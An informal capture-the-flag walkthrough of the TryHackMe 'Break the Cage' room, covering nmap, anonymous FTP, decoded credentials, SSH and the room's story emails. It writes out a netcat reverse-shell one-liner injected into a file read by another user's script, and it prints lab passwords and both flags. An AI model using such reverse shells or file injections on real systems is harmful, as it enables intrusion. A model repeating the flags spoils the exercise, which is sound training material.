hello guys it ALIEN here i was thinking of making a break the cage walkthough, its a tryhackme room ranked  (EASY), oky lets jump on the machine now.

STEP 1: enumuration and target scanning (remember to start the machine and set a vpn on your machine)
•  i just used a simple command: nmap  -sC -sV <target_ip> -oN nmap.txt



From the scanning above it observed that there are 3 openning ports 
1. ftp (21) which allow anonymous login
2. ssh(22)
3. http(80) which allows a simple webserver to run

NB: I started with the ftp enumuration, it seems as if the ftp allows anonymous login, where u can just try to login as 

username:anonymous
password:blanck(no pass)

When u login u will find a file try to download it because it contains some useful information  for us(the file contains some information but seems encoded in base 64).You can use any tool of your choise here

when u decode the base64 , it the decoded msg seems also it encrypted in vigenere cipher u can use any tool of your choise also here


After decoding the message we get these txt

Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes

• It seems as if we got the password here, lets try to find the username or the one whom own this password

STEP2: Visit a web browser, it seems as if nicholas cage as a son named weston and he is the one who  host his fathers blog, ohooooooo this sound good now after this information lets try to make some exploitations here

STEP 3: Exploitation
ssh creds
username:weston
password:Mydadisghostrideraintthatcoolnocausehesonfirejokes

NB: once we login, at the home directory we sees that weston added his dad as another user, so now we got two users here inside but can't login as cage(we have no passwd)

STEP 4:LETS FIRST FIND A WAY TO BE ROOT SO AS WE  GET THE FLAG EASY
in the home directory there two users
user1:cage
user2:weston(nothing i have found inside this user either any file )


NB:since we dont have the password for the user1:cage hence we can not login 
but since we have the password for the user weston lets see what he got so that he can run as a root without a password 

check this one:-      commad:sudo -l
User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees

i tried in gtfobins(bees) but got nothing lets try to search other materials


Lets try to find about  user:cage if he has anything on user:weston even if  it is a file 
command:find / -type f -user cage 2>/dev/null

OUTPUT:
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes

• Lets try to get a reverse shell for the user cage since because we have no password for him , but we have the files that can help us to get his shell
• 
reverse shell(for cage)
NB: you can change your directory (/tmp since because there is restriction of reading and writting in home directory)

command: echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.15.35 4444 >/tmp/f' > .quotes


finally we get a reverse shell for user cage: lets check what he got 

user.txt:THM{M37AL_0R_P3N_T35T1NG}

☐ lets check the email_backup directory
there are 3 emails 

email_1: from sean to cage

From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we 
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer



email_2:from cage to sean(i gues it a reply for the email sean sent to him prev)

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage

NB: the last two lines mean something(root), lets check the last email maybe password for root

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

Thank you
